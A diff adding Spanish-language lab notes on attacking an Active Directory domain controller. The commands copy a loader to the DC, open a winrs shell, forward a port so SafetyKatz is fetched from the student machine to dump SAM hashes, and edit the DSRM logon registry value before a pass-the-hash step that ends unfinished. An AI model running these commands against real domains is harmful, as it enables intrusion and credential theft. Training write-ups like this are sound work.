@@ -931,5 +931,35 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 Iniciaremos un proceso con privilegios de *Domain Admin* en este casop con *svcadmin*
 Copiaremos en el proceso nuevo el *Loader*
 ```shell
-[newCMD-]
+[newCMD as Administrator privileges]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+
+Nos conectaremos a la maquina *dcorp-dc* y obtendremos una shell como *svcadmin*
+```shell
+[newCMD as Administrator privileges]
+winrs -r:dcorp-dc cmd
+```
+
+Haremos la redireccion de puerto hacia nuestra maquina
+```shell
+[svcadmin]
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
+Y ejecutaremos el *SafetyKatz* a traves del *Loader*
+```shell
+[svcadmin]
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
+```
+
+EL administrador del *DSRM* no puede iniciar sesion en el *Domain Controller* desde la red, por lo cual necesitaremos cambier el inicio de sesion en la cuenta modificando el registro
+```shell
+[svcadmin]
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+```
+
+Ahora en nuestra maquian de estudiante podemos hacer un *Pass-The-Hash* para el administrador de *DSRM*
+```shell
+[student9]
 ```
